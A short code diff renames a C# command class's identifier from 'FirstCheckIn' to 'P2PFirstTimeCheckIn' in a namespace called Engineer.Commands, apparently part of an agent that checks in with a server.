@@ -12,7 +12,7 @@ namespace Engineer.Commands
     internal class FirstCheckIn : EngineerCommand
     {
         public static bool firstCheckInDone = false; 
-        public override string Name => "FirstCheckIn";
+        public override string Name => "P2PFirstTimeCheckIn";
 
         public override async Task Execute(EngineerTask task)
         {
